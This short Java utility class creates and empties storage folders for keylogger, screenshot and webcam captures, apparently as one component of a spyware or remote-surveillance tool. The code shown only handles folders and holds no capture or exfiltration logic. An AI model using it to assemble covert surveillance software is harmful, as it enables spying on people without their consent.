package ml.inix.util;

import ml.inix.Config;

import java.io.File;

public class FileManager {

    public static void clearAllData() {
        clearFolder(Config.PATH_KEYLOGGER);
        clearFolder(Config.PATH_SCREENSHOT);
        clearFolder(Config.PATH_WEBCAM);
    }

    public static void createReqFiles() {
        createFolder(Config.PATH + Config.NAME);
        createFolder(Config.PATH_KEYLOGGER);
        createFolder(Config.PATH_SCREENSHOT);
        createFolder(Config.PATH_WEBCAM);
    }

    private static void createFolder(String path) {
        new File(path).mkdir();
    }

    private static void clearFolder(String path) {
        File folder = new File(path);
        for (File file : folder.listFiles()) {
            file.delete();
        }
    }

}
